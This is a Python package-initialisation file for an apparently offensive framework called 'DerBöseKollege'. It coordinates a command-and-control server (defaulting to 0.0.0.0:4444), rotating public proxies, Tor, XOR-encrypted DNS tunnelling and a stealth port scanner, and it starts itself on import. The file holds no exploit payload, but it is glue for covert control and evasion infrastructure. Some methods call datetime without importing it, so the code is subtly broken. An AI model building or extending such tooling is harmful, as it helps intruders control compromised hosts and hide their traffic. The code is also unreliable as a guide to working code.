#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
network/__init__.py - Network Module Package Initialization

This module provides advanced networking capabilities for the DerBöseKollege framework.
Includes proxy management, Tor integration, DNS tunneling, port scanning, and C2 communication.
"""

import os
import sys
from typing import Dict, List, Optional, Any, Union, Callable

# Import all network modules
from .c2_server import C2Server, get_c2_server
from .proxy_manager import ProxyManager, get_proxy_manager
from .tor_integration import TorIntegration, get_tor_integration
from .dns_tunnel import DNSTunnel, get_dns_tunnel
from .port_scanner import PortScanner, get_port_scanner

# Version information
__version__ = "1.0.0"
__author__ = "DerBöseKollege Framework"
__description__ = "Advanced Networking Module"

# Module metadata
__all__ = [
    # C2 Server
    'C2Server',
    'get_c2_server',
    
    # Proxy Management
    'ProxyManager', 
    'get_proxy_manager',
    
    # Tor Integration
    'TorIntegration',
    'get_tor_integration',
    
    # DNS Tunneling
    'DNSTunnel',
    'get_dns_tunnel',
    
    # Port Scanning
    'PortScanner',
    'get_port_scanner',
    
    # Utility functions
    'get_network_manager',
    'get_all_network_stats',
    'test_network_modules',
    'export_network_config'
]

# Global network manager instances
_network_instances = {
    'c2_server': None,
    'proxy_manager': None,
    'tor_integration': None,
    'dns_tunnel': None,
    'port_scanner': None
}

class NetworkManager:
    """
    Central network management class for coordinating all network modules.
    
    This class provides a unified interface to all network capabilities
    and manages interactions between different network components.
    """
    
    def __init__(self, config: Dict[str, Any] = None):
        """
        Initialize NetworkManager with configuration.
        
        Args:
            config: Dictionary containing configuration for all network modules
        """
        self.config = config or {}
        
        # Module configurations
        self.c2_config = self.config.get('c2_server', {})
        self.proxy_config = self.config.get('proxy_manager', {})
        self.tor_config = self.config.get('tor_integration', {})
        self.dns_config = self.config.get('dns_tunnel', {})
        self.scanner_config = self.config.get('port_scanner', {})
        
        # Module instances
        self.c2_server = None
        self.proxy_manager = None
        self.tor_integration = None
        self.dns_tunnel = None
        self.port_scanner = None
        
        # Statistics
        self.stats = {
            'modules_initialized': 0,
            'modules_active': 0,
            'total_connections': 0,
            'total_data_transferred': 0,
            'start_time': None
        }
        
        # Initialize modules based on configuration
        self._initialize_modules()
    
    def _initialize_modules(self):
        """Initialize network modules based on configuration."""
        try:
            # Initialize C2 Server if configured
            if self.c2_config.get('enabled', False):
                self.c2_server = get_c2_server(self.c2_config)
                if self.c2_server:
                    _network_instances['c2_server'] = self.c2_server
                    self.stats['modules_initialized'] += 1
                    if self.c2_server.is_running():
                        self.stats['modules_active'] += 1
            
            # Initialize Proxy Manager
            if self.proxy_config.get('enabled', True):
                self.proxy_manager = get_proxy_manager(self.proxy_config)
                if self.proxy_manager:
                    _network_instances['proxy_manager'] = self.proxy_manager
                    self.stats['modules_initialized'] += 1
                    if self.proxy_manager.is_active():
                        self.stats['modules_active'] += 1
            
            # Initialize Tor Integration
            if self.tor_config.get('enabled', False):
                self.tor_integration = get_tor_integration(self.tor_config)
                if self.tor_integration:
                    _network_instances['tor_integration'] = self.tor_integration
                    self.stats['modules_initialized'] += 1
                    if self.tor_integration.state.value == 'running':
                        self.stats['modules_active'] += 1
            
            # Initialize DNS Tunnel
            if self.dns_config.get('enabled', False):
                self.dns_tunnel = get_dns_tunnel(self.dns_config)
                if self.dns_tunnel:
                    _network_instances['dns_tunnel'] = self.dns_tunnel
                    self.stats['modules_initialized'] += 1
                    self.stats['modules_active'] += 1  # DNS tunnel is always active
            
            # Initialize Port Scanner
            if self.scanner_config.get('enabled', True):
                self.port_scanner = get_port_scanner(self.scanner_config)
                if self.port_scanner:
                    _network_instances['port_scanner'] = self.port_scanner
                    self.stats['modules_initialized'] += 1
                    self.stats['modules_active'] += 1  # Scanner is always ready
            
            # Set start time
            from datetime import datetime
            self.stats['start_time'] = datetime.now()
            
        except Exception as e:
            print(f"Network module initialization error: {e}")
            raise
    
    def get_module(self, module_name: str) -> Optional[Any]:
        """
        Get a specific network module instance.
        
        Args:
            module_name: Name of the module ('c2_server', 'proxy_manager', etc.)
        
        Returns:
            Module instance or None if not found
        """
        return _network_instances.get(module_name)
    
    def get_all_modules(self) -> Dict[str, Any]:
        """
        Get all initialized network modules.
        
        Returns:
            Dictionary of module_name -> module_instance
        """
        return {k: v for k, v in _network_instances.items() if v is not None}
    
    def start_all(self) -> Dict[str, bool]:
        """
        Start all network modules.
        
        Returns:
            Dictionary of module_name -> success status
        """
        results = {}
        
        try:
            # Start C2 Server
            if self.c2_server:
                try:
                    success = self.c2_server.start()
                    results['c2_server'] = success
                    if success:
                        self.stats['modules_active'] += 1
                except Exception as e:
                    results['c2_server'] = False
            
            # Start Tor Integration
            if self.tor_integration:
                try:
                    success = self.tor_integration.start()
                    results['tor_integration'] = success
                    if success:
                        self.stats['modules_active'] += 1
                except Exception as e:
                    results['tor_integration'] = False
            
            # Other modules don't need explicit start
            
        except Exception as e:
            print(f"Error starting network modules: {e}")
        
        return results
    
    def stop_all(self) -> Dict[str, bool]:
        """
        Stop all network modules.
        
        Returns:
            Dictionary of module_name -> success status
        """
        results = {}
        
        try:
            # Stop C2 Server
            if self.c2_server:
                try:
                    self.c2_server.stop()
                    results['c2_server'] = True
                    self.stats['modules_active'] -= 1
                except Exception as e:
                    results['c2_server'] = False
            
            # Stop Tor Integration
            if self.tor_integration:
                try:
                    self.tor_integration.stop()
                    results['tor_integration'] = True
                    self.stats['modules_active'] -= 1
                except Exception as e:
                    results['tor_integration'] = False
            
            # Stop Port Scanner
            if self.port_scanner:
                try:
                    self.port_scanner.stop()
                    results['port_scanner'] = True
                    self.stats['modules_active'] -= 1
                except Exception as e:
                    results['port_scanner'] = False
            
        except Exception as e:
            print(f"Error stopping network modules: {e}")
        
        return results
    
    def get_combined_stats(self) -> Dict[str, Any]:
        """
        Get combined statistics from all network modules.
        
        Returns:
            Dictionary with combined statistics
        """
        combined_stats = {
            'network_manager': self.stats.copy(),
            'modules': {}
        }
        
        # Get stats from each module
        for module_name, module in self.get_all_modules().items():
            try:
                if hasattr(module, 'get_statistics'):
                    module_stats = module.get_statistics()
                    combined_stats['modules'][module_name] = module_stats
                    
                    # Aggregate total data transferred
                    if 'total_bytes_sent' in module_stats:
                        self.stats['total_data_transferred'] += module_stats.get('total_bytes_sent', 0)
                    if 'total_bytes_received' in module_stats:
                        self.stats['total_data_transferred'] += module_stats.get('total_bytes_received', 0)
                    
                    # Aggregate connections
                    if 'total_connections' in module_stats:
                        self.stats['total_connections'] += module_stats.get('total_connections', 0)
                    elif 'total_requests' in module_stats:
                        self.stats['total_connections'] += module_stats.get('total_requests', 0)
                    
            except Exception as e:
                print(f"Error getting stats from {module_name}: {e}")
        
        # Update combined stats
        combined_stats['network_manager'] = self.stats.copy()
        
        # Calculate uptime
        from datetime import datetime
        if self.stats['start_time']:
            uptime = (datetime.now() - self.stats['start_time']).total_seconds()
            combined_stats['network_manager']['uptime_seconds'] = uptime
            combined_stats['network_manager']['uptime_human'] = str(
                datetime.utcfromtimestamp(uptime).strftime('%H:%M:%S')
            )
        
        return combined_stats
    
    def test_connectivity(self) -> Dict[str, Any]:
        """
        Test connectivity for all active network modules.
        
        Returns:
            Dictionary with test results for each module
        """
        test_results = {
            'timestamp': datetime.now().isoformat(),
            'modules': {}
        }
        
        # Test C2 Server
        if self.c2_server:
            try:
                if hasattr(self.c2_server, 'test_connection'):
                    c2_test = self.c2_server.test_connection()
                    test_results['modules']['c2_server'] = c2_test
            except Exception as e:
                test_results['modules']['c2_server'] = {'error': str(e)}
        
        # Test Proxy Manager
        if self.proxy_manager:
            try:
                if hasattr(self.proxy_manager, 'test_proxies'):
                    proxy_test = self.proxy_manager.test_proxies(limit=3)
                    test_results['modules']['proxy_manager'] = proxy_test
            except Exception as e:
                test_results['modules']['proxy_manager'] = {'error': str(e)}
        
        # Test Tor Integration
        if self.tor_integration:
            try:
                if hasattr(self.tor_integration, 'test_connection'):
                    tor_test = self.tor_integration.test_connection()
                    test_results['modules']['tor_integration'] = tor_test
            except Exception as e:
                test_results['modules']['tor_integration'] = {'error': str(e)}
        
        # Test DNS Tunnel
        if self.dns_tunnel:
            try:
                if hasattr(self.dns_tunnel, 'test_tunnel'):
                    dns_test = self.dns_tunnel.test_tunnel()
                    test_results['modules']['dns_tunnel'] = dns_test
            except Exception as e:
                test_results['modules']['dns_tunnel'] = {'error': str(e)}
        
        # Test Port Scanner
        if self.port_scanner:
            try:
                # Test scanner with localhost
                scan_results = self.port_scanner.scan(
                    targets=['127.0.0.1'],
                    ports=[80, 443],
                    scan_type='tcp_connect'
                )
                test_results['modules']['port_scanner'] = {
                    'scan_successful': bool(scan_results),
                    'hosts_scanned': len(scan_results),
                    'ports_found': sum(len(h.ports) for h in scan_results.values())
                }
            except Exception as e:
                test_results['modules']['port_scanner'] = {'error': str(e)}
        
        # Overall connectivity test
        test_results['overall'] = {
            'modules_tested': len(test_results['modules']),
            'modules_successful': sum(1 for m in test_results['modules'].values() 
                                    if 'error' not in m),
            'timestamp': datetime.now().isoformat()
        }
        
        return test_results
    
    def export_configuration(self, filepath: Optional[str] = None) -> Dict[str, Any]:
        """
        Export current network configuration.
        
        Args:
            filepath: Optional path to save configuration JSON
        
        Returns:
            Dictionary with current configuration
        """
        config = {
            'c2_server': self.c2_config,
            'proxy_manager': self.proxy_config,
            'tor_integration': self.tor_config,
            'dns_tunnel': self.dns_config,
            'port_scanner': self.scanner_config,
            'export_timestamp': datetime.now().isoformat()
        }
        
        # Add module status
        config['module_status'] = {}
        for module_name, module in self.get_all_modules().items():
            if module:
                config['module_status'][module_name] = {
                    'initialized': True,
                    'active': self._is_module_active(module)
                }
        
        # Save to file if path provided
        if filepath:
            try:
                import json
                with open(filepath, 'w') as f:
                    json.dump(config, f, indent=2)
                print(f"Configuration exported to {filepath}")
            except Exception as e:
                print(f"Error exporting configuration: {e}")
        
        return config
    
    def _is_module_active(self, module) -> bool:
        """Check if a module is active."""
        try:
            if hasattr(module, 'is_running'):
                return module.is_running()
            elif hasattr(module, 'state'):
                return module.state.value == 'running'
            elif hasattr(module, 'is_active'):
                return module.is_active()
            else:
                return True  # Assume active if no status method
        except:
            return False
    
    def __del__(self):
        """Cleanup on deletion."""
        try:
            self.stop_all()
        except:
            pass

# Global NetworkManager instance
_network_manager = None

def get_network_manager(config: Dict[str, Any] = None) -> NetworkManager:
    """
    Get or create the global NetworkManager instance.
    
    Args:
        config: Configuration dictionary for network modules
    
    Returns:
        NetworkManager instance
    """
    global _network_manager
    
    if _network_manager is None:
        _network_manager = NetworkManager(config)
    
    return _network_manager

def get_all_network_stats() -> Dict[str, Any]:
    """
    Get statistics from all network modules.
    
    Returns:
        Dictionary with combined statistics
    """
    try:
        manager = get_network_manager()
        return manager.get_combined_stats()
    except Exception as e:
        return {'error': str(e)}

def test_network_modules() -> Dict[str, Any]:
    """
    Test all network modules for functionality.
    
    Returns:
        Dictionary with test results
    """
    try:
        manager = get_network_manager()
        return manager.test_connectivity()
    except Exception as e:
        return {'error': str(e)}

def export_network_config(filepath: Optional[str] = None) -> Dict[str, Any]:
    """
    Export current network configuration.
    
    Args:
        filepath: Optional path to save configuration
    
    Returns:
        Dictionary with configuration
    """
    try:
        manager = get_network_manager()
        return manager.export_configuration(filepath)
    except Exception as e:
        return {'error': str(e)}

# Example default configuration
DEFAULT_NETWORK_CONFIG = {
    'c2_server': {
        'enabled': False,
        'host': '0.0.0.0',
        'port': 4444,
        'encryption_key': None,
        'max_clients': 100
    },
    'proxy_manager': {
        'enabled': True,
        'proxy_sources': [
            'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all',
            'https://www.proxy-list.download/api/v1/get?type=http'
        ],
        'max_proxies': 100,
        'test_url': 'https://httpbin.org/ip',
        'rotation_interval': 300
    },
    'tor_integration': {
        'enabled': False,
        'socks_port': 9050,
        'control_port': 9051,
        'use_bridges': False,
        'max_circuits': 10,
        'auto_start': True
    },
    'dns_tunnel': {
        'enabled': False,
        'domain': 'example.com',
        'protocol': 'txt',
        'compression': 'zlib',
        'encryption': 'xor',
        'chunk_size': 180
    },
    'port_scanner': {
        'enabled': True,
        'timeout': 2.0,
        'max_threads': 100,
        'delay': 0.0,
        'use_stealth': True,
        'service_detection': True,
        'banner_grabbing': True
    }
}

# Initialize package with default configuration if not already initialized
def _initialize_package():
    """Initialize the network package on import."""
    try:
        # Check if any modules need initialization
        if all(v is None for v in _network_instances.values()):
            # Load configuration from file if exists
            config_path = os.path.join(os.path.dirname(__file__), 'network_config.json')
            if os.path.exists(config_path):
                import json
                with open(config_path, 'r') as f:
                    config = json.load(f)
            else:
                config = DEFAULT_NETWORK_CONFIG
            
            # Initialize manager
            get_network_manager(config)
            
    except Exception as e:
        print(f"Network package initialization error: {e}")

# Run initialization
_initialize_package()

# Module information for introspection
def get_module_info() -> Dict[str, Any]:
    """Get information about the network module."""
    return {
        'name': 'network',
        'version': __version__,
        'description': __description__,
        'author': __author__,
        'modules': __all__,
        'default_config': DEFAULT_NETWORK_CONFIG,
        'initialized': _network_manager is not None,
        'active_modules': sum(1 for v in _network_instances.values() if v is not None)
    }

if __name__ == "__main__":
    print("Network Module Package Initialization")
    print("=" * 50)
    
    info = get_module_info()
    print(f"Module: {info['name']} v{info['version']}")
    print(f"Description: {info['description']}")
    print(f"Author: {info['author']}")
    print(f"Initialized: {info['initialized']}")
    print(f"Active Modules: {info['active_modules']}")
    print()
    
    print("Available Modules:")
    for module in info['modules']:
        print(f"  - {module}")
    
    print()
    print("Testing network modules...")
    test_results = test_network_modules()
    
    print(f"Modules tested: {test_results.get('overall', {}).get('modules_tested', 0)}")
    print(f"Modules successful: {test_results.get('overall', {}).get('modules_successful', 0)}")
    
    print()
    print("✅ Network package initialization complete!")
